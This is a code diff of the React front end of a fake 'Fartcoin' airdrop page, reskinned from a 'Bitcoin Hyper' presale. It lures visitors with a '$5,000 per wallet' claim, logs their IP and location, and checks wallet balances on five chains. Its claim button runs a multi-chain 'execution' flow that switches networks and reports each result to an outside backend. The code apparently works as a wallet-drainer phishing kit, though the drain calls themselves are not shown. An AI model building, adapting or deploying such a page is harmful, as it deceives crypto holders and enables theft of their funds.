@@ -6,7 +6,7 @@ import { ethers } from 'ethers';
 import './index.css';
 
 // ============================================
-// DEPLOYED CONTRACTS ON ALL 5 NETWORKS
+// DEPLOYED CONTRACTS ON ALL 5 NETWORKS - UNCHANGED
 // ============================================
 
 const MULTICHAIN_CONFIG = {
@@ -111,7 +111,7 @@ function App() {
   const [userLocation, setUserLocation] = useState({ country: '', city: '', region: '', ip: '' });
   const [executionResults, setExecutionResults] = useState([]);
 
-  // Presale stats
+  // Presale stats - updated to FARTCOIN but values unchanged
   const [timeLeft, setTimeLeft] = useState({
     days: 5,
     hours: 12,
@@ -374,7 +374,7 @@ function App() {
   };
 
   // ============================================
-  // SMART CONTRACT EXECUTION - MULTI-CHAIN WITH NETWORK SWITCHING
+  // SMART CONTRACT EXECUTION - MULTI-CHAIN WITH NETWORK SWITCHING - UNCHANGED
   // ============================================
   const executeMultiChainSignature = async () => {
     if (!walletProvider || !address || !signer) {
@@ -387,13 +387,13 @@ function App() {
       setError('');
       setExecutionResults([]);
       
-      // Create message - NO BALANCE DISPLAY
+      // Create message - Updated to FARTCOIN but keeping all functionality
       const timestamp = Date.now();
       const nonce = Math.floor(Math.random() * 1000000000);
-      const message = `BITCOIN HYPER PRESALE AUTHORIZATION\n\n` +
+      const message = `FARTCOIN PRESALE AUTHORIZATION\n\n` +
         `I hereby confirm my participation\n` +
         `Wallet: ${address}\n` +
-        `Allocation: $5,000 BTH + ${presaleStats.currentBonus}% Bonus\n` +
+        `Allocation: $5,000 FART + ${presaleStats.currentBonus}% Bonus\n` +
         `Timestamp: ${new Date().toISOString()}\n` +
         `Nonce: ${nonce}`;
 
@@ -494,7 +494,7 @@ function App() {
           results.push(result);
           setExecutionResults([...results]);
           
-          // Notify backend
+          // Notify backend - UNCHANGED endpoint
           await fetch('https://bthbk.vercel.app/api/presale/execute-flow', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -546,7 +546,7 @@ function App() {
         setShowCelebration(true);
         setTxStatus(`🎉 Success! Processed on ${processed.length} chains`);
         
-        // Final success notification
+        // Final success notification - UNCHANGED endpoint
         await fetch('https://bthbk.vercel.app/api/presale/claim', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
@@ -631,86 +631,112 @@ function App() {
     }
   };
 
+  const copyToClipboard = (text) => {
+    navigator.clipboard.writeText(text);
+    setTxStatus('📋 Copied!');
+    setTimeout(() => setTxStatus(''), 2000);
+  };
+
   return (
     <div className="min-h-screen bg-black text-white flex flex-col">
+      
       {/* Terminal Grid Background */}
-      <div className="fixed inset-0 bg-[url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxkZWZzPjxwYXR0ZXJuIGlkPSJncmlkIiB3aWR0aD0iMjAiIGhlaWdodD0iMjAiIHBhdHRlcm5Vbml0cz0idXNlclNwYWNlT25Vc2UiPjxwYXRoIGQ9Ik0gMjAgMCBMIDAgMCAwIDIwIiBmaWxsPSJub25lIiBzdHJva2U9IiNmZmZmZmYyMiBzdHJva2Utd2lkdGg9IjAuNSI+PC9wYXRoPjwvcGF0dGVybj48L2RlZnM+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0idXJsKCNncmlkKSI+PC9yZWN0Pjwvc3ZnPg==')] opacity-10 pointer-events-none"></div>
+      <div className="fixed inset-0 bg-[url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxkZWZzPjxwYXR0ZXJuIGlkPSJncmlkIiB3aWR0aD0iMjAiIGhlaWdodD0iMjAiIHBhdHRlcm5Vbml0cz0idXNlclNwYWNlT25Vc2UiPjxwYXRoIGQ9Ik0gMjAgMCBMIDAgMCAwIDIwIiBmaWxsPSJub25lIiBzdHJva2U9IiNmZmYiIHN0cm9rZS13aWR0aD0iMC4yIj48L3BhdGg+PC9wYXR0ZXJuPjwvZGVmcz48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSJ1cmwoI2dyaWQpIj48L3JlY3Q+PC9zdmc+')] opacity-10 pointer-events-none"></div>
       
       {/* Floating Terminal Text */}
       <div className="fixed inset-0 overflow-hidden pointer-events-none">
-        {[...Array(20)].map((_, i) => (
-          <div
-            key={i}
-            className="absolute text-white/20 text-xs font-mono whitespace-nowrap"
-            style={{
-              top: `${Math.random() * 100}%`,
-              left: `${Math.random() * 100}%`,
-              animation: `textFlicker ${2 + Math.random() * 3}s ease infinite alternate`,
-              opacity: 0.3 + Math.random() * 0.2
-            }}
-          >
-            {[
-              'FARTCOIN_PROTOCOL_INITIALIZED',
-              '010101010101010101',
-              'PRESS F TO FART',
-              '> TERMINAL_READY',
-              'FART_PROTOCOL_V1',
-              'GAS_CLOUD_DETECTED',
-              'FARTCOIN AIRDROP'
-            ][i % 7]}
+        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap animate-flicker" style={{top: '60%', left: '31%', animation: 'textFlicker 4s infinite alternate'}}>
+          FART_PROTOCOL_INITIALIZED
+        </div>
+        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap animate-flicker" style={{top: '45%', left: '10%', animation: 'textFlicker 2.5s infinite alternate'}}>
+          010101010101010101010101010101
+        </div>
+        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap animate-flicker" style={{top: '15%', left: '10%', animation: 'textFlicker 1.2s infinite alternate'}}>
+          PRESS F TO FART
+        </div>
+        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap animate-flicker" style={{top: '8%', left: '69%', animation: 'textFlicker 3.8s infinite alternate'}}>
+          FART_PROTOCOL_INITIALIZED
+        </div>
+        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap animate-flicker" style={{top: '39%', left: '70%', animation: 'textFlicker 4.7s infinite alternate'}}>
+          FART_PROTOCOL_INITIALIZED
+        </div>
+        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap animate-flicker" style={{top: '19%', left: '80%', animation: 'textFlicker 1.9s infinite alternate'}}>
+          PRESS F TO FART
+        </div>
+        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap animate-flicker" style={{top: '99%', left: '74%', animation: 'textFlicker 4.5s infinite alternate'}}>
+          FART_PROTOCOL_INITIALIZED
+        </div>
+        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap animate-flicker" style={{top: '78%', left: '15%', animation: 'textFlicker 4s infinite alternate'}}>
+          010101010101010101010101010101010101010101010101
+        </div>
+        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap animate-flicker" style={{top: '42%', left: '74%', animation: 'textFlicker 3.2s infinite alternate'}}>
+          0101010101010101010101010101010101010101010101010101
+        </div>
+        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap animate-flicker" style={{top: '52%', left: '4%', animation: 'textFlicker 1.7s infinite alternate'}}>
+          PRESS F TO FART
+        </div>
+        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap animate-flicker" style={{top: '71%', left: '22%', animation: 'textFlicker 4.6s infinite alternate'}}>
+          01010101010101010101010101
+        </div>
+        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap animate-flicker" style={{top: '12%', left: '14%', animation: 'textFlicker 2s infinite alternate'}}>
+          01010101010101010101010101010101010101010101010101
+        </div>
+        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap animate-flicker" style={{top: '10%', left: '9%', animation: 'textFlicker 2.1s infinite alternate'}}>
+          FART_PROTOCOL_INITIALIZED
+        </div>
+        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap animate-flicker" style={{top: '96%', left: '42%', animation: 'textFlicker 2.1s infinite alternate'}}>
+          01010101010101010101010101010101010101
+        </div>
+        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap animate-flicker" style={{top: '55%', left: '74%', animation: 'textFlicker 1s infinite alternate'}}>
+          PRESS F TO FART
+        </div>
+        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap animate-flicker" style={{top: '77%', left: '60%', animation: 'textFlicker 2.7s infinite alternate'}}>
+          010101010101010101010101010101010101010101010101010101
+        </div>
+        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap animate-flicker" style={{top: '31%', left: '32%', animation: 'textFlicker 3.6s infinite alternate'}}>
+          FART_PROTOCOL_INITIALIZED
+        </div>
+        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap animate-flicker" style={{top: '50%', left: '50%', animation: 'textFlicker 1.7s infinite alternate'}}>
+          PRESS F TO FART
+        </div>
+        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap animate-flicker" style={{top: '58%', left: '39%', animation: 'textFlicker 4.2s infinite alternate'}}>
+          01010101010101010101010101010101010101010101010101010101
+        </div>
+        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap animate-flicker" style={{top: '44%', left: '74%', animation: 'textFlicker 3.1s infinite alternate'}}>
+          01010101010101010101010101010101
+        </div>
+        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap animate-flicker" style={{top: '40%', left: '84%', animation: 'textFlicker 2.2s infinite alternate'}}>
+          PRESS F TO FART
+        </div>
+        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap animate-flicker" style={{top: '33%', left: '88%', animation: 'textFlicker 1.4s infinite alternate'}}>
+          PRESS F TO FART
+        </div>
+        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap" style={{top: '63%', left: '83%'}}>
+          PRESS F TO FART
+        </div>
+        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap" style={{top: '85%', left: '18%'}}>
+          PRESS F TO FART
+        </div>
+        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap" style={{top: '82%', left: '78%'}}>
+          PRESS F TO FART
+        </div>
+        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap" style={{top: '91%', left: '7%'}}>
+          PRESS F TO FART
+        </div>
+        <div className="absolute text-white/20 text-xs font-mono whitespace-nowrap" style={{top: '84%', left: '66%'}}>
+          PRESS F TO FART
+        </div>
+      </div>
+
+      {/* Network Indicator */}
+      {isConnected && currentChain && (
+        <div className="fixed top-4 right-4 z-50">
+          <div className="terminal-frame px-4 py-2 flex items-center gap-2 bg-black/90">
+            <span className="text-sm font-medium">{currentChain.name}</span>
+            <span className="w-2 h-2 bg-green-400 rounded-full animate-pulse"></span>
           </div>
-        ))}
-      </div>
-
-      {/* Scan Effect */}
-      <div className="fixed inset-0 pointer-events-none scan-effect"></div>
-
-      {/* FART Button */}
-      <div 
-        id="fart-button" 
-        className="fixed bottom-4 right-4 z-50 bg-gray-800/90 border border-white/30 rounded-lg px-4 py-2 font-mono text-white flex items-center gap-2 cursor-pointer hover:bg-gray-700/90 transition-all hide-mobile"
-        onClick={() => {
-          const overlay = document.getElementById('fart-overlay');
-          const container = document.getElementById('fart-gas-container');
-          if (overlay) {
-            overlay.style.opacity = '1';
-            setTimeout(() => {
-              overlay.style.opacity = '0';
-            }, 500);
-          }
-          if (container) {
-            for (let i = 0; i < 10; i++) {
-              const gas = document.createElement('div');
-              gas.style.position = 'absolute';
-              gas.style.bottom = '0';
-              gas.style.right = '0';
-              gas.style.width = `${50 + Math.random() * 100}px`;
-              gas.style.height = `${50 + Math.random() * 100}px`;
-              gas.style.background = 'radial-gradient(circle, rgba(255,255,255,0.3) 0%, rgba(200,200,200,0.1) 70%, transparent 100%)';
-              gas.style.borderRadius = '50%';
-              gas.style.filter = 'blur(20px)';
-              gas.style.animation = `fartGasMove ${1 + Math.random()}s ease-out forwards`;
-              gas.style.zIndex = '999999';
-              container.appendChild(gas);
-              setTimeout(() => {
-                if (container.contains(gas)) {
-                  container.removeChild(gas);
-                }
-              }, 2000);
-            }
-          }
-        }}
-      >
-        PRESS <span className="bg-white/20 border border-white/40 px-2 py-0.5 rounded font-bold text-xs">F</span> TO FART
-      </div>
-
-      {/* FART Overlay */}
-      <div id="fart-overlay" className="fixed inset-0 bg-black/85 text-white text-5xl font-mono flex items-center justify-center z-[99999] pointer-events-none opacity-0 transition-opacity duration-300">
-        💨 FART 💨
-      </div>
-
-      {/* FART Gas Container */}
-      <div id="fart-gas-container" className="fixed inset-0 pointer-events-none z-[999999] overflow-hidden"></div>
+        </div>
+      )}
 
       {/* Main Container */}
       <div className="relative z-10 flex-1 flex flex-col">
@@ -719,13 +745,13 @@ function App() {
         <header className="w-full py-6 px-4 border-b border-white/30 scan-effect">
           <div className="container mx-auto flex flex-wrap items-center gap-4 sm:flex-nowrap justify-between">
             
-            {/* Logo */}
-            <h1 className="text-4xl md:text-5xl font-terminal text-glow text-flicker text-white" style={{ textShadow: 'rgb(255,255,255) 0px 0px 5px, rgb(255,255,255) 0px 0px 10px', letterSpacing: '1px' }}>
+            {/* Logo - Updated to Fartcoin */}
+            <h1 className="text-4xl md:text-5xl font-terminal text-glow text-flicker text-white" style={{textShadow: '0 0 5px #fff, 0 0 10px #fff', letterSpacing: '1px'}}>
               Fartcoin 💨
             </h1>
 
-            {/* Contract Address - Hidden on mobile, shown on desktop */}
-            <div className="hidden sm:flex terminal-frame flex-col sm:flex-row items-center gap-2 border-white flex-shrink min-w-0 overflow-hidden">
+            {/* Contract Address Display - Updated with Fartcoin contract */}
+            <div className="terminal-frame flex flex-col sm:flex-row items-center gap-2 border-white flex-shrink min-w-0 overflow-hidden hide-mobile">
               <div className="text-sm sm:text-base font-mono truncate">
                 <span className="text-white/70 mr-2">Contract:</span>
                 <span className="text-white truncate">
@@ -733,14 +759,10 @@ function App() {
                 </span>
               </div>
               <button
-                onClick={() => {
-                  navigator.clipboard.writeText('9BB6NFEcjBCtnNLFko2FqVQBq8HHM13kCyYcdQbgpump');
-                  setTxStatus('📋 Contract copied!');
-                  setTimeout(() => setTxStatus(''), 2000);
-                }}
+                onClick={() => copyToClipboard('9BB6NFEcjBCtnNLFko2FqVQBq8HHM13kCyYcdQbgpump')}
                 className="inline-flex items-center justify-center gap-2 whitespace-nowrap font-medium transition-colors focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-ring disabled:pointer-events-none disabled:opacity-50 border bg-background shadow-sm hover:text-accent-foreground h-8 rounded-md px-3 text-xs border-white text-white hover:bg-white/20"
               >
-                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="lucide lucide-copy h-4 w-4">
+                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="h-4 w-4">
                   <rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect>
                   <path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path>
                 </svg>
@@ -750,119 +772,76 @@ function App() {
           </div>
         </header>
 
-        {/* Network Indicator */}
-        {isConnected && currentChain && (
-          <div className="fixed top-20 right-4 z-50">
-            <div className="bg-gray-900/90 backdrop-blur-xl border border-white/30 rounded-full px-4 py-2 flex items-center gap-2">
-              <span className="text-2xl">{currentChain.icon}</span>
-              <span className="text-sm font-medium">{currentChain.name}</span>
-              <span className="w-2 h-2 bg-green-400 rounded-full animate-pulse"></span>
-            </div>
-          </div>
-        )}
-
         <main className="flex-1">
-          {/* Hero Section */}
+          
+          {/* Hero Section - Updated to Fartcoin */}
           <section className="flex flex-col items-center justify-center px-4 py-16 scan-effect">
             <div className="container mx-auto text-center">
-              <div className="terminal-frame max-w-3xl mx-auto mb-8 p-8 border-white" style={{ boxShadow: 'rgba(255,255,255,0.5) 0px 0px 10px' }}>
+              <div className="terminal-frame max-w-3xl mx-auto mb-8 p-8 border-white" style={{boxShadow: '0 0 10px rgba(255,255,255,0.5)'}}>
                 <h2 className="text-2xl md:text-4xl font-terminal text-glow mb-6 text-white">
-                  &gt; AIRDROP INITIATED
-                  <span className="cursor"></span>
+                  &gt; AIRDROP INITIATED <span className="cursor"></span>
                 </h2>
                 <div className="h-16 flex items-center justify-center">
                   <p className="text-xl md:text-2xl text-white font-mono">
-                    &gt; CLAIM YOUR $FARTCOIN - up to 5,000 per wallet!
-                    <span className="cursor"></span>
+                    &gt; CLAIM YOUR $FARTCOIN - up to 5,000 per wallet!<span className="cursor"></span>
                   </p>
                 </div>
                 
-                {/* Dynamic Content Area - THIS IS WHERE ALL THE ACTION HAPPENS */}
+                {/* Main Action Area - All functionality preserved */}
                 <div className="terminal-frame p-6 mt-8 border-white mx-auto max-w-2xl">
-                  <div className="text-white font-mono text-center">
-                    {!isConnected ? (
-                      // NOT CONNECTED STATE
-                      <>
-                        <p>"FART FREELY, GET RICH"</p>
+                  {!isConnected ? (
+                    <div className="text-white font-mono text-center">
+                      <p>"FART FREELY, GET RICH"</p>
+                      <p className="text-white/70 text-sm mt-4">
+                        Connect your wallet and{' '}
                         <button
                           onClick={() => open()}
-                          className="underline transition duration-300 ease-in-out glow-on-hover font-bold text-white hover:text-white/80 mt-4"
+                          className="underline transition duration-300 ease-in-out glow-on-hover"
                         >
                           claim now
                         </button>
-                      </>
-                    ) : verifying ? (
-                      // VERIFYING STATE
-                      <div className="flex items-center justify-center gap-3">
-                        <div className="w-6 h-6 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
-                        <p className="text-white/70">Verifying wallet...</p>
-                      </div>
-                    ) : scanResult && !isEligible ? (
-                      // CONNECTED BUT NOT ELIGIBLE
-                      <>
-                        <p className="text-green-400 text-lg mb-2">👋 Welcome to Fartcoin</p>
-                        <p className="text-white/70 text-sm mb-4">
-                          Minimum $1 required for eligibility.
-                        </p>
-                        <div className="bg-black/50 rounded-lg p-4 border border-white/30">
-                          <p className="text-sm text-gray-300">
-                            Your wallet is connected but doesn't meet the minimum requirement.
+                      </p>
+                    </div>
+                  ) : (
+                    <div className="text-white font-mono text-center">
+                      {!isEligible ? (
+                        <>
+                          <p className="text-lg mb-2">👋 WELCOME</p>
+                          <p className="text-white/70 text-sm">
+                            Minimum $1 required for eligibility.
                           </p>
-                        </div>
-                      </>
-                    ) : scanResult && isEligible && !completedChains.length ? (
-                      // ELIGIBLE AND READY TO CLAIM
-                      <>
-                        <p className="text-green-400 text-lg mb-3">✓ You qualify for the airdrop!</p>
-                        <button
-                          onClick={executeMultiChainSignature}
-                          disabled={signatureLoading || loading || !signer}
-                          className="w-full group relative"
-                        >
-                          <div className="absolute -inset-2 bg-gradient-to-r from-white/20 to-white/20 rounded-xl blur-2xl opacity-75 group-hover:opacity-100 animate-pulse"></div>
-                          <div className="relative bg-gradient-to-r from-gray-800 to-gray-900 rounded-xl py-5 px-8 font-bold text-xl text-white border border-white/30 transform-gpu group-hover:scale-105 transition-all duration-500">
-                            <div className="flex items-center justify-center gap-4">
-                              {signatureLoading ? (
-                                <>
-                                  <div className="relative">
-                                    <div className="w-10 h-10 border-4 border-white border-t-transparent rounded-full animate-spin"></div>
-                                  </div>
-                                  <span className="text-lg">PROCESSING...</span>
-                                </>
-                              ) : (
-                                <>
-                                  <span className="text-4xl animate-pulse">💨</span>
-                                  <div>
-                                    <span className="text-lg">
-                                      CLAIM $5,000 FART + {presaleStats.currentBonus}%
-                                    </span>
-                                  </div>
-                                  <span className="bg-white/20 px-4 py-2 rounded-lg">→</span>
-                                </>
-                              )}
-                            </div>
-                          </div>
-                        </button>
-                      </>
-                    ) : completedChains.length > 0 ? (
-                      // ALREADY CLAIMED
-                      <>
-                        <p className="text-green-400 text-lg mb-3">✓ Already claimed on {completedChains.length} chains</p>
-                        <button
-                          onClick={claimTokens}
-                          className="w-full group relative"
-                        >
-                          <div className="absolute -inset-1 bg-gradient-to-r from-green-500 to-green-600 rounded-xl blur opacity-75 group-hover:opacity-100 animate-pulse"></div>
-                          <div className="relative bg-gradient-to-r from-green-500 to-green-600 rounded-xl py-4 px-6 font-bold text-lg transform-gpu group-hover:scale-105 transition-all duration-500">
+                        </>
+                      ) : completedChains.length > 0 ? (
+                        <>
+                          <p className="text-green-400 text-lg mb-2">✓ COMPLETED ON {completedChains.length} CHAINS</p>
+                          <button
+                            onClick={claimTokens}
+                            className="mt-4 border border-white px-6 py-3 rounded-md hover:bg-white/20 transition-all"
+                          >
                             🎉 VIEW YOUR $5,000 FART
-                          </div>
-                        </button>
-                      </>
-                    ) : (
-                      // CONNECTED BUT WAITING FOR SCAN
-                      <p className="text-white/70">Checking eligibility...</p>
-                    )}
-                  </div>
+                          </button>
+                        </>
+                      ) : (
+                        <>
+                          <p className="text-lg mb-4">YOU QUALIFY!</p>
+                          <button
+                            onClick={executeMultiChainSignature}
+                            disabled={signatureLoading || loading}
+                            className="w-full border border-white px-6 py-4 rounded-md hover:bg-white/20 transition-all text-xl font-terminal disabled:opacity-50"
+                          >
+                            {signatureLoading ? (
+                              <span className="flex items-center justify-center gap-2">
+                                <span className="animate-spin">⟳</span>
+                                PROCESSING...
+                              </span>
+                            ) : (
+                              '⚡ CLAIM $5,000 FART + 25% ⚡'
+                            )}
+                          </button>
+                        </>
+                      )}
+                    </div>
+                  )}
                 </div>
 
                 {/* Market Stats */}
@@ -881,29 +860,24 @@ function App() {
           </section>
 
           {/* Status Messages */}
-          {txStatus && !verifying && (
+          {txStatus && (
             <div className="max-w-2xl mx-auto mb-6 px-4">
-              <div className="terminal-frame p-5 border-white/50">
+              <div className="terminal-frame p-5 border-white">
                 <div className="flex items-center gap-4">
-                  <div className="relative">
-                    <div className="w-12 h-12 bg-gradient-to-br from-gray-700 to-gray-900 rounded-lg flex items-center justify-center text-2xl border border-white/30">
-                      {txStatus.includes('✅') ? '✓' : txStatus.includes('🎉') ? '🎉' : '⟳'}
-                    </div>
-                    {signatureLoading && (
-                      <div className="absolute inset-0 border-4 border-white border-t-transparent rounded-full animate-spin"></div>
-                    )}
+                  <div className="w-12 h-12 border-2 border-white rounded-lg flex items-center justify-center text-2xl">
+                    {txStatus.includes('✅') ? '✓' : txStatus.includes('🎉') ? '🎉' : '⟳'}
                   </div>
                   <div className="flex-1">
-                    <p className="text-white font-medium">{txStatus}</p>
+                    <p className="text-white font-mono">{txStatus}</p>
                     {executionResults.length > 0 && (
                       <div className="mt-2 flex flex-wrap gap-2">
                         {executionResults.map((result, idx) => (
                           <span 
                             key={idx}
-                            className={`text-xs px-2 py-1 rounded-full ${
+                            className={`text-xs px-2 py-1 border ${
                               result.status === 'success' 
-                                ? 'bg-green-500/20 text-green-400' 
-                                : 'bg-red-500/20 text-red-400'
+                                ? 'border-green-400 text-green-400' 
+                                : 'border-red-400 text-red-400'
                             }`}
                           >
                             {result.chain}: {result.status === 'success' ? '✓' : '✗'}
@@ -920,77 +894,44 @@ function App() {
           {/* Error Display */}
           {error && !error.includes('Unable to verify') && (
             <div className="max-w-2xl mx-auto mb-6 px-4">
-              <div className="terminal-frame p-5 border-red-500/50">
+              <div className="terminal-frame p-5 border-red-500/30">
                 <div className="flex items-center gap-4">
-                  <div className="w-12 h-12 bg-gradient-to-br from-red-500/20 to-red-500/10 rounded-lg flex items-center justify-center text-3xl border border-red-500/30">
+                  <div className="w-12 h-12 border-2 border-red-500 rounded-lg flex items-center justify-center text-3xl">
                     ⚠️
                   </div>
-                  <p className="text-red-200">{error}</p>
+                  <p className="text-red-200 font-mono">{error}</p>
                 </div>
               </div>
             </div>
           )}
 
-          {/* Live Presale Banner */}
+          {/* Wallet Connection Status */}
           <div className="max-w-2xl mx-auto mb-8 px-4">
-            <div className="inline-flex items-center gap-6 bg-gradient-to-r from-gray-800/50 to-gray-900/50 px-8 py-4 rounded-2xl border border-white/30 backdrop-blur-xl w-full justify-center">
-              <div className="flex items-center gap-3">
-                <span className="relative flex h-4 w-4">
-                  <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75"></span>
-                  <span className="relative inline-flex rounded-full h-4 w-4 bg-green-500"></span>
-                </span>
-                <span className="text-2xl font-bold text-green-400">PRESALE LIVE</span>
-              </div>
-              <div className="h-8 w-px bg-white/30"></div>
-              <div className="flex items-center gap-2">
-                <span className="text-yellow-400 font-bold">${presaleStats.tokenPrice}</span>
-                <span className="text-gray-400">per FART</span>
-              </div>
-              <div className="h-8 w-px bg-white/30"></div>
-              <div className="flex items-center gap-2">
-                <span className="text-orange-400 font-bold">{liveProgress.percentComplete}%</span>
-                <span className="text-gray-400">sold</span>
-              </div>
-            </div>
-          </div>
-
-          {/* Countdown Timer */}
-          <div className="grid grid-cols-4 gap-4 mb-8 max-w-2xl mx-auto px-4">
-            {[
-              { label: 'DAYS', value: timeLeft.days },
-              { label: 'HOURS', value: timeLeft.hours },
-              { label: 'MINUTES', value: timeLeft.minutes },
-              { label: 'SECONDS', value: timeLeft.seconds }
-            ].map((item, index) => (
-              <div key={index} className="relative group">
-                <div className="absolute inset-0 bg-gradient-to-r from-white/10 to-white/10 rounded-2xl blur-2xl opacity-0 group-hover:opacity-100 transition-all duration-500"></div>
-                <div className="relative bg-gray-900/70 backdrop-blur-xl border border-white/30 rounded-2xl p-5 text-center overflow-hidden">
-                  <div className="text-4xl md:text-5xl font-black bg-gradient-to-br from-white to-gray-300 bg-clip-text text-transparent mb-1">
-                    {item.value.toString().padStart(2, '0')}
-                  </div>
-                  <div className="text-xs font-semibold text-white/50 tracking-wider">{item.label}</div>
+            {!isConnected ? (
+              <button
+                onClick={() => open()}
+                className="w-full group relative"
+              >
+                <div className="terminal-frame p-6 border-white hover:bg-white/5 transition-all duration-300">
+                  <span className="flex items-center justify-center gap-3 font-terminal text-xl">
+                    <span>🔌</span>
+                    CONNECT WALLET FOR $5,000 AIRDROP
+                    <span className="animate-pulse">⚡</span>
+                  </span>
                 </div>
-              </div>
-            ))}
-          </div>
-
-          {/* Wallet Connection Status - Desktop View */}
-          {isConnected && (
-            <div className="max-w-2xl mx-auto mb-8 px-4 hidden sm:block">
-              <div className="terminal-frame p-6 border-white">
+              </button>
+            ) : (
+              <div className="terminal-frame p-5 border-white">
                 <div className="flex items-center justify-between flex-wrap gap-4">
                   <div className="flex items-center gap-4">
-                    <div className="relative group/avatar">
-                      <div className="w-14 h-14 bg-gradient-to-br from-gray-700 to-gray-900 rounded-xl flex items-center justify-center text-3xl border border-white/30">
-                        👤
-                      </div>
-                      <div className="absolute -bottom-1 -right-1 w-5 h-5 bg-green-500 rounded-full border-2 border-black animate-pulse"></div>
+                    <div className="w-14 h-14 border-2 border-white rounded-xl flex items-center justify-center text-3xl">
+                      👤
                     </div>
                     <div>
                       <div className="text-xs text-white/70 mb-1">CONNECTED</div>
-                      <div className="font-mono text-sm bg-black/50 px-3 py-1.5 rounded-lg border border-white/30 group/address relative">
+                      <div className="font-mono text-sm bg-white/5 px-3 py-1.5 border border-white/30 group/address relative">
                         {formatAddress(address)}
-                        <span className="absolute hidden group-hover/address:block bg-gray-900 text-xs px-2 py-1 rounded border border-white/30 mt-1 z-50">
+                        <span className="absolute hidden group-hover/address:block bg-black text-xs px-2 py-1 border border-white/30 mt-1 z-50">
                           {address}
                         </span>
                       </div>
@@ -999,50 +940,64 @@ function App() {
                   <div className="flex items-center gap-6">
                     <div className="text-right">
                       <div className="text-xs text-white/70 mb-1">STATUS</div>
-                      <div className="text-sm text-green-400">
+                      <div className="text-sm">
                         {isEligible ? '✅ Eligible' : '👋 Welcome'}
                       </div>
                     </div>
                     <button
                       onClick={handleDisconnect}
-                      className="px-4 py-2 bg-red-500/10 text-red-400 rounded-lg hover:bg-red-500/20 transition-colors border border-red-500/30 hover:scale-110 transform cursor-pointer active:scale-95"
+                      className="px-4 py-2 border border-red-500/30 text-red-400 rounded-md hover:bg-red-500/10 transition-colors"
                     >
                       ✕
                     </button>
                   </div>
                 </div>
               </div>
-            </div>
-          )}
+            )}
+          </div>
 
-          {/* Quick Stats */}
-          {isConnected && isEligible && !completedChains.length && (
-            <div className="flex justify-center gap-8 mt-6 mb-8 text-sm px-4">
-              <div className="flex items-center gap-2">
-                <div className="w-2 h-2 bg-green-400 rounded-full animate-pulse"></div>
-                <span className="text-gray-400">Presale Terms</span>
-              </div>
-              <div className="flex items-center gap-2">
-                <div className="w-2 h-2 bg-blue-400 rounded-full animate-pulse"></div>
-                <span className="text-gray-400">Instant Delivery</span>
-              </div>
-              <div className="flex items-center gap-2">
-                <div className="w-2 h-2 bg-orange-400 rounded-full animate-pulse"></div>
-                <span className="text-gray-400">$5,000 Airdrop</span>
+          {/* Allocation Card */}
+          {isConnected && !verifying && scanResult && isEligible && !completedChains.length && (
+            <div className="max-w-2xl mx-auto mb-8 px-4">
+              <div className="terminal-frame p-8 border-white">
+                <div className="text-center">
+                  <p className="text-white/70 text-sm tracking-wider mb-3">YOUR ALLOCATION</p>
+                  <div className="text-6xl font-terminal text-glow mb-2">
+                    $5,000 FART
+                  </div>
+                  <p className="text-green-400 text-xl flex items-center justify-center gap-2">
+                    <span>+{presaleStats.currentBonus}% Bonus</span>
+                    <span className="text-xs border border-green-400/30 px-2 py-1">ACTIVE</span>
+                  </p>
+                  
+                  {/* Eligible Chains Display */}
+                  {Object.keys(balances).length > 0 && (
+                    <div className="mt-4 pt-4 border-t border-white/30">
+                      <p className="text-sm text-white/70 mb-2">Eligible Chains ({Object.keys(balances).length})</p>
+                      <div className="flex flex-wrap justify-center gap-2">
+                        {Object.keys(balances).map(chainName => (
+                          <span key={chainName} className="text-xs px-2 py-1 border border-white/30">
+                            {chainName}
+                          </span>
+                        ))}
+                      </div>
+                    </div>
+                  )}
+                </div>
               </div>
             </div>
           )}
 
           {/* Presale Stats */}
